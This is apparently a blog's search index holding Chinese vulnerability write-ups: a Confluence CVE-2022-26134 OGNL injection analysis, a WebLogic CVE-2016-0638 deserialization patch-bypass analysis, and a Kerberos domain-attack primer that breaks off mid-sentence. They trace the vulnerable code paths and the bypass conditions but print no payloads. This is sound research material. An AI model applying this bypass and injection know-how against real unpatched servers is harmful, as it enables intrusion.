<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CVE-2022-26134 Confluence 远程代码执行漏洞分析</title>
    <link href="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近爆了一个CVE-2022-26134 远程代码执行漏洞，而且还是未授权情况下的漏洞，闲来无事进行分析</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文将从以下方面进行讲述</p><ul><li>漏洞影响</li><li>环境搭建</li><li>漏洞分析</li><li>漏洞利用</li></ul><h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>Confluence Server and Data Center &gt;= 1.3.0</p><p>Confluence Server and Data Center &lt; 7.4.17</p><p>Confluence Server and Data Center &lt; 7.13.7</p><p>Confluence Server and Data Center &lt; 7.14.3</p><p>Confluence Server and Data Center &lt; 7.15.2</p><p>Confluence Server and Data Center &lt; 7.16.4</p><p>Confluence Server and Data Center &lt; 7.17.4</p><p>Confluence Server and Data Center &lt; 7.18.1</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>使用vulhub搭建漏洞试调环境：<a href="https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134">vulhub</a></p><p>或者直接复制以下docker-compose.yaml文件</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">version:</span> <span class="hljs-string">&#x27;2&#x27;</span><br><span class="hljs-symbol">services:</span><br><span class="hljs-symbol">  web:</span><br><span class="hljs-symbol">    image:</span> vulhub/confluence:<span class="hljs-number">7.13</span><span class="hljs-number">.6</span><br><span class="hljs-symbol">    ports:</span><br>      - <span class="hljs-string">&quot;8090:8090&quot;</span><br><span class="hljs-symbol">    depends_on:</span><br>      - db<br><span class="hljs-symbol">  db:</span><br><span class="hljs-symbol">    image:</span> postgres:<span class="hljs-number">12.8</span>-alpine<br><span class="hljs-symbol">    environment:</span><br>    - POSTGRES_PASSWORD=postgres<br>    - POSTGRES_DB=confluence<br></code></pre></td></tr></table></figure><p>环境构建成功后，进入docker容器，修改<code>/opt/atlassian/confluence/confluence/WEB-INF/setenv.sh</code>文件，CATALINA_OPTS处添加debug信息</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">CATALINA_OPTS</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;CATALINA_OPTS&#125;</span> -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5050&quot;</span><br><br><span class="hljs-builtin-name">export</span> CATALINA_OPTS<br></code></pre></td></tr></table></figure><p>退出容器后重启容器</p><p>同时将容器中的/opt/atlassian/confluence/目录拷贝到主机来，用IDEA打开，配置远程JVM试调环境</p><p>使用IDEA将/confluence/WEB-INF下的atlassian-bundled-plugins、atlassian-bundled-plugins-setup、lib文件添加为lib依赖</p><p>点击试调，试调环境运行成功<br><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615162031590.png"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在ServletDispatcher#service打下断点</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615171445967.png"></p><p>可以看到，在this.serviceAction()里，有以下函数<br>this.getNameSpace(request), this.getActionName(request), this.getRequestMap(request), this.getParameterMap(request), this.getSessionMap(request), this.getApplicationMap()</p><p>其对应关系应该为：</p><ul><li>getNameSpace(request) -&gt; namespace</li><li>getActionName(request) -&gt; actionName</li><li>getRequestMap(request) -&gt; requestMap</li><li>getParameterMap(request) -&gt; parameterMap</li><li>getSessionMap(request) -&gt; sessionMap</li><li>getApplicationMap() -&gt; applicationMap</li></ul><p>在本文利用中，主要与namespace有关，跟进this.getNameSpace(request)函数</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615172118262.png"></p><p>通过调用ServletDispatcher#getNamespaceFromServletPath函数，获取namespace的值</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615172239719.png"></p><p>其获取规则为：servletPath 最后一个/之前的字符串</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615172417127.png"></p><p>继续跟进，到ConfluenceServletDispatcher#serviceAction函数</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615172618859.png"></p><p>这里实例化 DefaultActionProxy 对象 proxy，并调用了其execute方法</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615173353714.png"></p><p>这里会调用DefaultActionInvocation#invoke方法</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615173614999.png"></p><p>这里开始调用 Struts Interceptor 拦截器对象对请求进行处理，在DefaultActionInvocation中，拦截器集合一共有28个</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615174043705.png"></p><p>这里通过this.interceptors.next()获取拦截器，再通过interceptor.intercept函数调用</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-2022061517420488.png"></p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615174346491.png"></p><p>再intercept函数，继续调用DefaultActionInvocation#invoke，形成迭代循环</p><p>当处理到ConfluenceAccessInterceptor拦截器时，就会继续往下走，进入executeResult函数</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615175941831.png"></p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615175952647.png"></p><p>进入 ActionChainResult#execute</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615180024215.png"></p><p>这里以namespace为参数，进入TextParseUtil.translateVariables函数</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615180157258.png"></p><p>这里调用OgnlValueStack#findValue函数对表达式进行解析</p><p><img src="/2022/06/14/CVE-2022-26134%20Confluence%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220615180648588.png"></p><p>造成了Ognl表达式注入漏洞</p><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Confluence</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic CVE-2016-0638 反序列化漏洞分析</title>
    <link href="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Weblogic漏洞分析第二篇：CVE-2016-0638</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要讲述以下内容</p><ul><li>CVE-2015-4852补丁</li><li>ObjectInputStream反序列化流程</li><li>CVE-2016-0638</li></ul><h1 id="CVE-2015-4852补丁"><a href="#CVE-2015-4852补丁" class="headerlink" title="CVE-2015-4852补丁"></a>CVE-2015-4852补丁</h1><p>根据<a href="https://www.oracle.com/security-alerts/alert-cve-2015-4852.html">官方通报</a>，需要两个补丁</p><ul><li>p22248372_1036012_Generic</li><li>p20780171_1036_Generic</li></ul><p>继续沿用之前的docker镜像，将补丁复制到docker容器中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker cp ..<span class="hljs-regexp">/p20780171_1036_Generic  weblogic1036jdk7u21:/</span>p20780171_1036_Generic<br><br>docker cp ..<span class="hljs-regexp">/p22248372_1036012_Generic  weblogic1036jdk7u21:/</span>p22248372_1036012_Generic<br><br>docker exec -it weblogic1036jdk7u21 <span class="hljs-regexp">/bin/</span>bash<br><br>cd <span class="hljs-regexp">/u01/</span>app<span class="hljs-regexp">/oracle/mi</span>ddleware<span class="hljs-regexp">/utils/</span>bsu<br><br>mkdir cache_dir<br><br>vi bsu.sh   编辑MEM_ARGS参数为<span class="hljs-number">1024</span><br><br>cp <span class="hljs-regexp">/p20780171_1036_Generic/</span>* cache_dir/<br><br>.<span class="hljs-regexp">/bsu.sh -install -patch_download_dir=/u</span>01<span class="hljs-regexp">/app/</span>oracle<span class="hljs-regexp">/middleware/u</span>tils<span class="hljs-regexp">/bsu/</span>cache_dir<span class="hljs-regexp">/ -patchlist=EJUW -prod_dir=/u</span>01<span class="hljs-regexp">/app/</span>oracle<span class="hljs-regexp">/middleware/</span>wlserver/<br><br>cp <span class="hljs-regexp">/p22248372_1036012_Generic/</span>* cache_dir/<br><br>.<span class="hljs-regexp">/bsu.sh -install -patch_download_dir=/u</span>01<span class="hljs-regexp">/app/</span>oracle<span class="hljs-regexp">/middleware/u</span>tils<span class="hljs-regexp">/bsu/</span>cache_dir<span class="hljs-regexp">/ -patchlist=ZLNA  -prod_dir=/u</span>01<span class="hljs-regexp">/app/</span>oracle<span class="hljs-regexp">/middleware/</span>wlserver/ –verbose<br></code></pre></td></tr></table></figure><p>重新启动Docker，重启weblogic服务</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317142351859.png"></p><p>此时将复制出的文件替换之前的文件，详情可见<a href>Weblogic CVE-2015-4852 反序列化漏洞分析</a></p><p>点击试调，成功运行</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317142515553.png"></p><h1 id="ObjectInputStream反序列化流程"><a href="#ObjectInputStream反序列化流程" class="headerlink" title="ObjectInputStream反序列化流程"></a>ObjectInputStream反序列化流程</h1><p>InboundMsgAbbrev.class$ServerChannelInputStream继承的是ObjectInputStream，在试调的过程中，发现调用的是ObjectInputStream.readObejct()方法。</p><p>因此，弄清楚ObjectInputStream.readObejct()方法的调用流程有助于我们理解：反序列化到底做了什么</p><p>先看一张图</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/InputObjectStream.jpg"></p><ol><li>InboundMsgAbbrev$readObject，调用ObjectInputStream.readObject方法</li><li>ObjectInputStream.readObject，调用ObjectInputStream.readObject0方法</li><li>ObjectInputStream.readObject0，调用ObjectInputStream.readOrdinaryObject方法</li><li>ObjectInputStream.readOrdinaryObject，调用ObjectInputStream.readClassDesc方法</li><li>这里有一个switch选择，共有五个分支<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">TC<span class="hljs-emphasis">_NULL描述符表示空对象引用</span><br><span class="hljs-emphasis">TC_REFERENCE描述符表示引用已写入流的对象</span><br><span class="hljs-emphasis">TC_PROXYCLASSDESC是新的代理类描述符</span><br><span class="hljs-emphasis">TC_</span>CLASSDESC是新的类描述符<br></code></pre></td></tr></table></figure>根据数据类型选择对应分支，在此次试调中，对应的是TC_CLASSDESC</li><li>ObjectInputStream.readNonProxyDesc，获取类描述符，将之作为参数传入resolveClass</li><li>由于weblogic中InboundMsgAbbrev$ServerChannelInputStream重写了resolveClass方法，因此传至InboundMsgAbbrev中，参数为类描述符，返回值为实例化类</li><li>调用ObjectStreamClass.initNonProxy，对desc对象进行初始化</li><li>返回一个ObjectStreamClass对象到ObjectInputStream.readOrdinaryObject中</li><li>根据返回的desc类描述符初始化一个目标对象</li><li>判断desc是否实现Externalizable，如果实现则进入readExternalData中，如果没有实现，则进入readSerialData中</li><li>ObjectInputStream.readSerialData调用目标类的readObject方法，ObjectInputStream.readExternalData调用了目标类的readExternal方法</li><li>判断表示的类是可序列化的或可外部化的并且定义了一个符合标准的 readResolve 方法</li><li>如果符合，则调用目标类的readResolve方法</li><li>结束流程，返回反序列化Object</li></ol><p>在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法。</p><h1 id="CVE-2016-0638漏洞分析"><a href="#CVE-2016-0638漏洞分析" class="headerlink" title="CVE-2016-0638漏洞分析"></a>CVE-2016-0638漏洞分析</h1><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>根据官方说法，补丁的修补位置</p><ul><li>weblogic.rjvm.InboundMsgAbbrev.class :: ServerChannelInputStream</li><li>weblogic.rjvm.MsgAbbrevInputStream.class</li><li>weblogic.iiop.Utils.class</li></ul><p>补丁前后对比</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317143205652.png"></p><p>可以发现在resolveClass中多了一个ClassFilter</p><p>跟进查看，先执行了一个静态代码</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317150249404.png"></p><p>调用了updatebalcklist方法</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317150448762.png"></p><p>最终变量BLACK_LIST中的值为</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317150529356.png"></p><p>通过BLACK_LIST.contains(pkgName)进行判断，如果在黑名单里，则返回true</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317150620956.png"></p><p>最后抛出错误</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317150807596.png"></p><p>如果不在BLACK_LIST中，则进入else代码区</p><h2 id="补丁绕过"><a href="#补丁绕过" class="headerlink" title="补丁绕过"></a>补丁绕过</h2><p>如果要绕过补丁，需要满足以下条件</p><ul><li>readObject中创建ObjectInputStream</li><li>不使用ServerChannelInputStream和MsgAbbrevInputStream的readObject进行的反序列化</li><li>readObject中调用ObjectInputStream的readObject方法</li></ul><h2 id="StreamMessageImpl"><a href="#StreamMessageImpl" class="headerlink" title="StreamMessageImpl"></a>StreamMessageImpl</h2><p>StreamMessageImpl#readExternal</p><p>在StreamMessageImpl的readExternal方法中，恰好满足绕过补丁的条件</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317171356310.png"></p><p>这里去除var4的值新建了一个ObjectInputStream对象var5，并在后续过程中调用了var5.readObject()方法</p><p>这里var4的数据来源于var1</p><h2 id="试调"><a href="#试调" class="headerlink" title="试调"></a>试调</h2><p><a href>工具来源</a></p><p>在StreamMessageImpl#readExternal打下断点</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317180515538.png"></p><p>查看调用栈</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">readExternal</span>:<span class="hljs-number">1396</span>, StreamMessageImpl (weblogic.jms.common)<br><span class="hljs-attribute">readExternalData</span>:<span class="hljs-number">1835</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readOrdinaryObject</span>:<span class="hljs-number">1794</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readObject0</span>:<span class="hljs-number">1348</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readObject</span>:<span class="hljs-number">370</span>, ObjectInputStream (java.io)<br><span class="hljs-attribute">readObject</span>:<span class="hljs-number">69</span>, InboundMsgAbbrev (weblogic.rjvm)<br><span class="hljs-attribute">read</span>:<span class="hljs-number">41</span>, InboundMsgAbbrev (weblogic.rjvm)<br><span class="hljs-attribute">readMsgAbbrevs</span>:<span class="hljs-number">283</span>, MsgAbbrevJVMConnection (weblogic.rjvm)<br><span class="hljs-attribute">init</span>:<span class="hljs-number">215</span>, MsgAbbrevInputStream (weblogic.rjvm)<br><span class="hljs-attribute">dispatch</span>:<span class="hljs-number">498</span>, MsgAbbrevJVMConnection (weblogic.rjvm)<br><span class="hljs-attribute">dispatch</span>:<span class="hljs-number">330</span>, MuxableSocketT<span class="hljs-number">3</span> (weblogic.rjvm.t<span class="hljs-number">3</span>)<br><span class="hljs-attribute">dispatch</span>:<span class="hljs-number">394</span>, BaseAbstractMuxableSocket (weblogic.socket)<br><span class="hljs-attribute">readReadySocketOnce</span>:<span class="hljs-number">960</span>, SocketMuxer (weblogic.socket)<br><span class="hljs-attribute">readReadySocket</span>:<span class="hljs-number">897</span>, SocketMuxer (weblogic.socket)<br><span class="hljs-attribute">processSockets</span>:<span class="hljs-number">130</span>, PosixSocketMuxer (weblogic.socket)<br><span class="hljs-attribute">run</span>:<span class="hljs-number">29</span>, SocketReaderRequest (weblogic.socket)<br><span class="hljs-attribute">execute</span>:<span class="hljs-number">42</span>, SocketReaderRequest (weblogic.socket)<br><span class="hljs-attribute">execute</span>:<span class="hljs-number">145</span>, ExecuteThread (weblogic.kernel)<br><span class="hljs-attribute">run</span>:<span class="hljs-number">117</span>, ExecuteThread (weblogic.kernel)<br></code></pre></td></tr></table></figure><p>发现在ObjectInputStream$readExternalData中调用了StreamMessageImpl#readExternal，参数为<br>InboundMsgAbbrev#ServerChannelInputStream</p><p>var4为一个getInputStream函数的返回值，查看其值，为序列化数据</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317181523779.png"></p><p>var5 = new ObjectInputStream(var4)，参数为var4</p><p>调用var5.readObject()，进入AnnotationInvocationHandler#readObject</p><p><img src="/2022/03/15/Weblogic%20CVE-2016-0638%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220317182118196.png"></p><p>后续就是CC1链的的实现了。</p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>本文分析了ObjectInputStream调用流程，并给出了CVE-2016-0638的漏洞分析</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/8443#toc-1">https://xz.aliyun.com/t/8443#toc-1</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Weblogic</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之Kerberos协议</title>
    <link href="/2021/12/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/"/>
    <url>/2021/12/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8BKerberos%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要讲述以下内容</p><ul><li>AS_REQ &amp; AS_REP</li><li>AS_REQ &amp; AS_REP流程中的安全问题</li><li>TGS_REQ &amp; TGS_REP</li><li>TGS_REQ &amp; TGS_REP流程中的安全问题</li><li>PAC &amp; MS14-068</li></ul><h1 id="Kerberos简述"><a href="#Kerberos简述" class="headerlink" title="Kerberos简述"></a>Kerberos简述</h1><p>Kerberos是一种由MIT（麻省理工大学）提出的一种网络身份验证协议。</p><p>它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。</p><p>在Kerberos协议中主要是有三个角色的存在：</p><ul><li>访问服务的Client(以下表述为Client 或者用户)</li><li>提供服务的Server(以下表述为服务)</li><li>KDC（Key Distribution Center）密钥分发中心 kerberos 测试工具介绍</li></ul><p>其中KDC服务默认会安装在一个域的域控中，而Client和Server为域内的用户或者是服务，如HTTP服务，SQL服务。在Kerberos中Client是否有权限访问Server端的服务由KDC发放的票据来决定。</p><h2 id="Kerberos中的常见角色"><a href="#Kerberos中的常见角色" class="headerlink" title="Kerberos中的常见角色"></a>Kerberos中的常见角色</h2><p>在Kerberos认证中常见的角色如下</p><div align="center"><img src="/images/markdown-img-paste-20211215175105949.png" width="XXX" height="XXX"></div><ul><li>DC（Domain Controller) : 域控制器</li><li>KDC (Key Distribution Center) : 密钥分发中心，负责管理票据、认证票据、分发票据。包含两个服务：AS 和TGS</li><li>AS (Authentication Server) : 身份认证服务</li><li>TGS (Ticket Granting Server) : 票据授予服务,该服务提供的票据也称为 TGS 或者叫白银票据</li><li>AD (Account Database) : 账户数据库，存储所有client的白名单，只有存在于白名单的client才能顺利申请到TGT。</li><li>TGT (Ticket Granting Ticket) : 由身份认证服务授予的票据(比如黄金票据)，用于身份认证，默认有效期为10小时（临时凭证）</li><li>Ticket : 票据，是访问网络对象的凭证</li><li>krbtgt账户：每个域控制器都有一个 krbtgt 的用户账户，是 KDC的服务账户，用来创建票据授予服务(TGS)加密的密钥</li></ul><h2 id="Kerberos简化认证流程"><a href="#Kerberos简化认证流程" class="headerlink" title="Kerberos简化认证流程"></a>Kerberos简化认证流程</h2><p>Kerberos简化认证流程如下</p><div align="center"><img src="/images/markdown-img-paste-20211215175253183.png" width="XXX" height="XXX"></div><ul><li><p>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</p></li><li><p>AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组。</p></li><li><p>TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</p></li><li><p>TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</p></li><li><p>AP_REQ: Client拿着TGS票据去请求服务</p></li><li><p>AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</p></li></ul><h1 id="AS-REQ-amp-AS-REP"><a href="#AS-REQ-amp-AS-REP" class="headerlink" title="AS_REQ &amp; AS_REP"></a>AS_REQ &amp; AS_REP</h1><p>AS_REQ &amp; AS_REP 是Kerberos认证的第一个流程，Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</p><p>这里我们使用daiker师傅的工具来模拟发包：<a href="https://github.com/daikerSec/windows_protocol/raw/master/tools/kerberosGui.exe">https://github.com/daikerSec/windows_protocol/raw/master/tools/kerberosGui.exe</a></p><p>连接配置</p><p><img src="/images/markdown-img-paste-20211216101624978.png"></p><p>勾选PAPAC_REQUEST和ENCTIMESTAMp和etypes里的rc4hmac，模拟发包</p><p><img src="/images/markdown-img-paste-20211216101839217.png"></p><p>此时wireshark可以抓到AS-REQ和AS-REP包</p><p><img src="/images/markdown-img-paste-20211216101931584.png"></p><h2 id="AS-REQ"><a href="#AS-REQ" class="headerlink" title="AS_REQ"></a>AS_REQ</h2><h3 id="pvon"><a href="#pvon" class="headerlink" title="pvon"></a>pvon</h3><p>Kerberos版本</p><h3 id="msg-type"><a href="#msg-type" class="headerlink" title="msg-type"></a>msg-type</h3><p>Kerberos类型 0x0a对应krb-as-req</p><h3 id="PA-DATA"><a href="#PA-DATA" class="headerlink" title="PA_DATA"></a>PA_DATA</h3><p>预身份验证数据，被用来增强 KDC 的初始身份验证。它是一个列表，包含若干个认证消息用于认证，每一个认证消息都包含type和value</p><p>在AS_REQ阶段主要用到这两个</p><ol><li>ENC_TIMESTAMP</li></ol><ul><li>PA-ENC-TIMESTAMP是预认证，使用用户hash加密时间戳，AS存放了用户的hash，AS用用户hash解密获得时间戳。如果时间戳在某一个时间则认证成功。<br><img 